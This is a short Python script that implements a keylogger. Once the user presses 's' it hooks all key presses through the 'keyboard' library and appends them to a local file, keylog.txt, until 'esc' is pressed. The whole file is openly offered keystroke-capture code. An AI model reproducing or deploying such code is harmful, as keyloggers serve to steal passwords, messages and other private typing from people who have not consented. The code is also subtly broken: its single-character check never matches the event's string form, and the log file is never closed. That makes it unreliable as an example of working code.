import keyboard

# Function to start the keylogger
def start_keylogger():
    log_file = open('keylog.txt', 'a')
    log_file.write("Keylogger started\n")
    keyboard.on_press(lambda event: log_key(event, log_file))

# Function to stop the keylogger
def stop_keylogger():
    keyboard.unhook_all()

# Function to log keystrokes
def log_key(key, log_file):
    key = str(key)
    if len(key) == 3 and key[0] == "'" and key[2] == "'":
        # Key is a single character
        log_file.write(key[1] + '\n')
    else:
        # Key is a special key (e.g., space, enter, shift)
        log_file.write(key + '\n')

# Main function
def main():
    print("Press 's' to start the keylogger. Press 'esc' to terminate the program..\n")

    while True:
        key = keyboard.read_event()
        if key.name == 's':
            print("Keylogger start...")
            start_keylogger()
        elif key.name == 'esc':
            print("Keylogger terminated...")
            print("--------------------------------------")
            stop_keylogger()
            break

print("\n\n************************************************\n")
if __name__ == "__main__":
    main()
